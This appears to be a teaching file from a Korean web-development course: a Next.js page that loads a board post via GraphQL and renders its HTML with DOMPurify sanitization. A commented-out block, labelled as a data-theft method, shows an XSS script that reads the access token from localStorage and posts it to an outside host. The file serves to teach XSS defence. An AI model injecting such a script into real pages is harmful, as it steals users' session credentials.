import { useQuery, gql } from "@apollo/client";
import { useRouter } from "next/router";
import DOMPurify from "dompurify";

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
  const router = useRouter();
  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.qqq },
  });
  return (
    <>
      <div style={{ color: "red" }}>작성자: {data?.fetchBoard.writer}</div>
      <div style={{ color: "green" }}>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard?.contents}</div>
       */}
      {/* 태그가 그대로 나오니 html태그로 나오게하기 */}

      {/* <div
        dangerouslySetInnerHTML={{ // 정보탈취방법1
          __html: 
              <script>
                const qqq = localStorage.getItem("accessToken")
                axios.post("http://mybackerbackend.com/mydata", {data: qqq})
              </script>
          ,
        }}
      /> */}
      {typeof window !== "undefined" ? (
        <div
          style={{ color: "blue" }}
          dangerouslySetInnerHTML={{
            __html: DOMPurify.sanitize(data?.fetchBoard.contents), // XSS막기 //DOMPurify도 프리렌더링 안됨
          }}
        ></div>
      ) : (
        <div style={{ color: "blue" }} />
      )}
      <div style={{ color: "brown" }}>주소: 구로구</div>
    </>
  );
}
